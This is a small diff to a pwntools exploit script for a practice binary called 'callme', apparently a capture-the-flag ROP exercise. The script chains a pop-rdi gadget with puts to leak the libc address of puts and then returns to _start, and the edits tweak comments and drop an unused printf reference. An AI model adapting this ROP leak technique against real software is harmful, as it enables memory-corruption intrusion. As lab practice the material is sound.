@@ -5,8 +5,6 @@ elf = context.binary = ELF("./callme")
 PUTS_PLT = elf.plt["puts"]
 PUTS_GOT = elf.got["puts"]
 
-PRINTF_PLT = elf.plt["printf"]
-
 START = elf.symbols._start
 
 POP_RDI_GADGET = p64(0x4009a3)
@@ -24,7 +22,7 @@ payload1 += POP_RDI_GADGET
 payload1 += p64(PUTS_GOT)
 # call puts
 payload1 += p64(PUTS_PLT)
-# call main
+# call start
 payload1 += p64(START)
 
 conn = process()
@@ -35,6 +33,7 @@ print("[*] sending payload 1")
 conn.send(payload1)
 
 conn.recvuntil(b"Thank you!\n")
+# bit of a hack but it works
 puts_addr = u64(conn.recv(6) + b'\x00\x00')
 print("[*] received libc_puts address %s" % hex(puts_addr))
 
